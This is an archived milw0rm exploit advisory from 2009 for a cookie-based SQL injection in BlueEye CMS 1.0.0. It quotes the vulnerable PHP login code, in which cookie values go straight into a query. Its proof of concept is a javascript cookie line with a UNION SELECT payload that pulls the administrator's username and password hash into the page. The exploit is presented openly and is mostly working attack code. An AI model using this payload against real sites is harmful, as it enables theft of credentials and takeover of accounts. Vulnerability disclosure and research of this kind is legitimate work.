<html><head><title>Blue Eye CMS <= 1.0.0 Remote Cookie SQL Injection Vulnerability</title></head><pre>#
# BlueEye CMS &lt;= 1.0.0 Remote Cookie SQL Injection Vulnerability
# found by ka0x &lt;ka0x01[alt+64]gmail.com&gt;
# 

Download: http://kent.dl.sourceforge.net/sourceforge/blueeyecms/blue_eye_cms-1_0_0_preRC.rar
need magic_quotes_gpc = Off

- Vuln code:

10:	if (!empty($_COOKIE[&quot;BlueEyeCMS_login&quot;])) { 	// --&gt; Only??
11:		$c_login = $_COOKIE[&quot;BlueEyeCMS_login&quot;]; // --&gt; Not clean??
12:		$c_pass = $_COOKIE[&quot;BlueEyeCMS_pass&quot;];
13:		$c_key = $_COOKIE[&quot;BlueEyeCMS_key&quot;];
....	
16:	        $table = $db_prefix.&quot;users&quot;;
17:	        $query = mysql_query(&quot;SELECT id FROM `$table` WHERE `user` = '$c_login' AND `password` = '$c_pass' AND `key` = '$c_key'&quot;); // -&gt; VULN
18:          	$rows = mysql_num_rows($query); -&gt; num rows of the query
19:          	$result = mysql_fetch_array($query);
....
21:      	if ($rows == 1) { // -&gt; check if exists one row..
22:      		$logged = $c_login;
23:      		$logged_id = $result['id'];
24:      	}
....
204:	       &lt;img src=\&quot;themes/&quot;.$theme.&quot;/images/dots.png\&quot;&gt;&amp;nbsp;&amp;nbsp;Logged as: &quot;.$logged.&quot; (ID: &quot;.$logged_id.&quot;)&lt;br&gt;


- Proof Of Concept:
javascript:document.cookie = &quot;BlueEyeCMS_login=' UNION SELECT concat(user,0x3A,password) FROM blueeye_users WHERE id=1/*; path=/&quot;;

# -EoF- #

# milw0rm.com [2009-03-06]</pre></html>